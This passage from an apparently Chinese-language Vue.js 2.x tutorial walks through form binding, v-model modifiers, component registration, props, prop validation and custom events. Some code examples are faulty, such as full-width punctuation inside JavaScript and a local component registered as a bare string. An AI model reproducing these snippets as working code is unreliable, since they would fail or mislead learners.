class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/vue/2.6.10/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;checkbox&quot; v-model=&quot;checked&quot; :true-value=&quot;value1&quot; :false-value=&quot;value2&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;&quot;&gt;复选框&lt;/label&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123;checked&#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123;value1&#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123;value2&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var app = new Vue(&#123;</span><br><span class="line">            el: &apos;#app&apos;,</span><br><span class="line">            data: &#123;</span><br><span class="line">               checked: false,</span><br><span class="line">                value1: &apos;a&apos;,</span><br><span class="line">                value2: &apos;b&apos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><h4 id="选择列表-1"><a href="#选择列表-1" class="headerlink" title="选择列表"></a>选择列表</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/vue/2.6.10/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;select name=&quot;&quot; id=&quot;&quot; v-model=&quot;selected&quot;&gt;</span><br><span class="line">            &lt;option :value=&quot;&#123; number: 123&#125;&quot;&gt;123&lt;/option&gt;</span><br><span class="line">        &lt;/select&gt;</span><br><span class="line">        &#123;&#123;selected.number&#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var app = new Vue(&#123;</span><br><span class="line">            el: &apos;#app&apos;,</span><br><span class="line">            data: &#123;</span><br><span class="line">                selected: &apos;&apos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><h3 id="修饰符-1"><a href="#修饰符-1" class="headerlink" title="修饰符"></a>修饰符</h3><ul><li><p><strong>.lazy</strong></p><p><strong>使用了lazy将不再是实时同步，需要失焦或者按enter才会实行同步</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/vue/2.6.10/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-model.lazy=&quot;message&quot;&gt;</span><br><span class="line">        &#123;&#123;message&#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var app = new Vue(&#123;</span><br><span class="line">            el: &apos;#app&apos;,</span><br><span class="line">            data: &#123;</span><br><span class="line">                message: &apos;&apos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div></li><li><p><strong>.number</strong></p><p><strong>可以将输入的装换成Number类型。如果不使用时虽然我们输入的是数字，但它会被转成string类型。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; v-model.number=&quot;message&quot;&gt;</span><br><span class="line">    &#123;&#123;typeof message&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            message: &apos;123&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div></li><li><p><strong>.trim</strong></p><p><strong>可以自动过滤掉首尾输入的空格。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; v-model.trim=&quot;message&quot;&gt;</span><br><span class="line">    &#123;&#123; message&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            message: &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="组件详解"><a href="#组件详解" class="headerlink" title="组件详解"></a>组件详解</h2><h3 id="组件与复用"><a href="#组件与复用" class="headerlink" title="组件与复用"></a>组件与复用</h3><h4 id="组件使用"><a href="#组件使用" class="headerlink" title="组件使用"></a>组件使用</h4><blockquote><h5 id="组件需要注册后才可以使用。注册有两种：全局注册和局部注册。下面是全局注册的例子："><a href="#组件需要注册后才可以使用。注册有两种：全局注册和局部注册。下面是全局注册的例子：" class="headerlink" title="组件需要注册后才可以使用。注册有两种：全局注册和局部注册。下面是全局注册的例子："></a>组件需要注册后才可以使用。注册有两种：全局注册和局部注册。下面是全局注册的例子：</h5></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(&apos;组件名称&apos;,&#123;&#125;)</span><br></pre></td></tr></table></figure></div><p><strong>在组件选项中添加template就可以显示组件内容啦。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;my-component&gt;&lt;/my-component&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    Vue.component(&apos;my-component&apos;,&#123;</span><br><span class="line">        template: &apos;&lt;div&gt;这是组件&lt;/div&gt;&apos;</span><br><span class="line">    &#125;)</span><br><span class="line">var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p><strong>渲染得到的是:</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;#app&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        这是组件</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></div><blockquote><h5 id="使用components可以实现局部注册。注册后的组件只能在组件的作用域下生效。"><a href="#使用components可以实现局部注册。注册后的组件只能在组件的作用域下生效。" class="headerlink" title="使用components可以实现局部注册。注册后的组件只能在组件的作用域下生效。"></a>使用components可以实现局部注册。注册后的组件只能在组件的作用域下生效。</h5></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;my-component&gt;&lt;/my-component&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"> var child = &quot;&lt;div&gt;这是组件&lt;/div&gt;&quot;</span><br><span class="line">var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            &apos;my-component&apos;: child</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p><strong>渲染得到的是:</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;#app&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        这是组件</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></div><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p><strong>除了template外，我们还可以使用data,computed等。但是使用data时，和实例不同。data必须是函数，然后讲值return出去。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;my-component&gt;&lt;/my-component&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    Vue.component(&apos;my-component&apos;,&#123;</span><br><span class="line">        template: &apos;&lt;div&gt;&#123;&#123;message&#125;&#125;&lt;/div&gt;&apos;,</span><br><span class="line">        data: function （）&#123;</span><br><span class="line">        return &#123;</span><br><span class="line">        message： &apos;这是组件&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h3 id="使用props传递参数"><a href="#使用props传递参数" class="headerlink" title="使用props传递参数"></a>使用props传递参数</h3><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><blockquote><h5 id="通常父组件的模板中包含子组件，父组件要正向地向子组件传递数据或参数，子组件接收到后根据参数的不同来渲染不同的内容或执行操作。这个正向传递数据的过程就是通过-props-来实现的。"><a href="#通常父组件的模板中包含子组件，父组件要正向地向子组件传递数据或参数，子组件接收到后根据参数的不同来渲染不同的内容或执行操作。这个正向传递数据的过程就是通过-props-来实现的。" class="headerlink" title="通常父组件的模板中包含子组件，父组件要正向地向子组件传递数据或参数，子组件接收到后根据参数的不同来渲染不同的内容或执行操作。这个正向传递数据的过程就是通过 props 来实现的。"></a>通常父组件的模板中包含子组件，父组件要正向地向子组件传递数据或参数，子组件接收到后根据参数的不同来渲染不同的内容或执行操作。这个正向传递数据的过程就是通过 props 来实现的。</h5></blockquote><p><strong>使用选项 prop 来声明需要从父级接收的数据， prop 的值可以是两种，一种是字符串数组，一种是对象。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;my-component message=&quot;这是组件&quot;&gt;&lt;/my-component&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    Vue.component(&apos;my-component&apos;,&#123;</span><br><span class="line">        props: [&apos;message&apos;],</span><br><span class="line">        template: &apos;&lt;div&gt;&#123;&#123;message&#125;&#125;&lt;/div&gt;&apos;</span><br><span class="line">    &#125;)</span><br><span class="line">var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p><strong>渲染得到的是:</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;#app&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        这是组件</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></div><p><strong>当要使用Dom模板时，驼峰命名的props名称需要转为短横分隔命名。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;my-component Component-Text=&quot;这是组件&quot;&gt;&lt;/my-component&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    Vue.component(&apos;my-component&apos;,&#123;</span><br><span class="line">        props: [&apos;ComponentText&apos;],</span><br><span class="line">        template: &apos;&lt;div&gt;&#123;&#123;ComponentText&#125;&#125;&lt;/div&gt;&apos;</span><br><span class="line">    &#125;)</span><br><span class="line">var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p><strong>渲染得到的是：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;#app&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        这是组件</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></div><p><strong>有时候传递的参数不是固定的，这时候我们需要使用v-bind来动态绑定props的值。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; v-model=&quot;inputtext&quot;&gt;</span><br><span class="line">    &lt;my-component v-bind:message=&quot;inputtext&quot;&gt;&lt;/my-component&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    Vue.component(&apos;my-component&apos;,&#123;</span><br><span class="line">        props: [&apos;message&apos;],</span><br><span class="line">        template: &apos;&lt;div&gt;&#123;&#123;message&#125;&#125;&lt;/div&gt;&apos;</span><br><span class="line">    &#125;)</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">       el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">           inputtext: &apos;这是组件&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h4 id="单项数据流"><a href="#单项数据流" class="headerlink" title="单项数据流"></a>单项数据流</h4><blockquote><h5 id="Vue2-x-通过-props-传递数据是单向的了，-也就父组件数据变化时会传递给子组件，但是反过来不行。"><a href="#Vue2-x-通过-props-传递数据是单向的了，-也就父组件数据变化时会传递给子组件，但是反过来不行。" class="headerlink" title="Vue2.x 通过 props 传递数据是单向的了， 也就父组件数据变化时会传递给子组件，但是反过来不行。"></a>Vue2.x 通过 props 传递数据是单向的了， 也就父组件数据变化时会传递给子组件，但是反过来不行。</h5></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;mycomponent :initcount=&quot;1&quot;&gt;&lt;/mycomponent&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        Vue.component(&apos;mycomponent&apos;,&#123;</span><br><span class="line">           props: [&apos;initcount&apos;],</span><br><span class="line">            template: &apos;&lt;div&gt;&#123;&#123;count&#125;&#125;&lt;/div&gt;&apos;,</span><br><span class="line">            data: function () &#123;</span><br><span class="line">                return &#123;</span><br><span class="line">                    count: this.initcount</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        var app = new Vue(&#123;</span><br><span class="line">           el: &apos;#app&apos;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;mycomponent :width=&quot;100&quot;&gt;&lt;/mycomponent&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        Vue.component(&apos;mycomponent&apos;,&#123;</span><br><span class="line">           props: [&apos;width&apos;],</span><br><span class="line">            template: &apos;&lt;div :style=&quot;style&quot;&gt;这是组件&lt;/div&gt;&apos;,</span><br><span class="line">           computed: &#123;</span><br><span class="line">                style: function () &#123;</span><br><span class="line">                    return &#123;</span><br><span class="line">                        width: this.width + &apos;px&apos;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        var app = new Vue(&#123;</span><br><span class="line">           el: &apos;#app&apos;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></div><h4 id="数据验证"><a href="#数据验证" class="headerlink" title="数据验证"></a>数据验证</h4><p><strong>验证类型：</strong></p><pre><code>- **String**- **Number**- **Boolean**- **Object**- **Array**- **Function**</code></pre><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(&apos;mycomponent&apos;,&#123;</span><br><span class="line">    props: &#123;</span><br><span class="line">        // 必须是数字类型</span><br><span class="line">        propA: Number,</span><br><span class="line">        // 必须字符串或者数字类型</span><br><span class="line">        propB: [String,Number],</span><br><span class="line">        // 布尔类型。如果没定义，默认为true</span><br><span class="line">        propC: &#123;</span><br><span class="line">            type: Boolean,</span><br><span class="line">            default: true</span><br><span class="line">        &#125;,</span><br><span class="line">        // 数字类型，必须上传</span><br><span class="line">        propD: &#123;</span><br><span class="line">            type: Number,</span><br><span class="line">            required: true</span><br><span class="line">        &#125;,</span><br><span class="line">        // 如果是一个数组或者对象，必须要是一个函数来返回</span><br><span class="line">        propE: &#123;</span><br><span class="line">            type: Array,</span><br><span class="line">            default: function () &#123;</span><br><span class="line">                return []</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="组件通信"><a href="#组件通信" class="headerlink" title="组件通信"></a>组件通信</h3><h4 id="自定义事件"><a href="#自定义事件" class="headerlink" title="自定义事件"></a>自定义事件</h4><blockquote><h5 id="子组件用-emit（）来触发事件，父组件用-on（）来监昕子组件的事件。"><a href="#子组件用-emit（）来触发事件，父组件用-on（）来监昕子组件的事件。" class="headerlink" title="子组件用 $emit（）来触发事件，父组件用$on（）来监昕子组件的事件。"></a>子组件用 $emit（）来触发事件，父组件用$on（）来监昕子组件的事件。</h5></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;p&gt;总数：&#123;&#123;total&#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;mycomponent @increase=&quot;GetTotal&quot; @reduce=&quot;GetTotal&quot;&gt;&lt;/mycomponent&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        Vue.component(&apos;mycomponent&apos;,&#123;</span><br><span class="line">            template: &apos;&lt;div&gt;&lt;button @click=&quot;InCrease&quot;&gt;+1&lt;/button&gt; </span><br><span class="line">            &lt;button @click=&quot;Reduce&quot;&gt;-1&lt;/button&gt;&lt;/div&gt;&apos;,</span><br><span class="line">            data: function () &#123;</span><br><span class="line">                return &#123;</span><br><span class="line">                    counter: 0</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                InCrease: function () &#123;</span><br><span class="line">                    this.counter ++;</span><br><span class="line">                    this.$emit(&apos;increase&apos;,this.counter);</span><br><span class="line">                &#125;,</span><br><span class="line">                Reduce: function () &#123;</span><br><span class="line">                    this.counter --;</span><br><span class="line">                    this.$emit(&apos;reduce&apos;,this.counter);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        var app = new Vue(&#123;</span><br><span class="line">           el: &apos;#app&apos;,</span><br><span class="line">           data: &#123;</span><br><span class="line">               total: 0</span><br><span class="line">           &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                GetTotal: function (total) &#123;</span><br><span class="line">                    this.total = total;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h4 id="使用v-model"><a href="#使用v-model" class="headerlink" 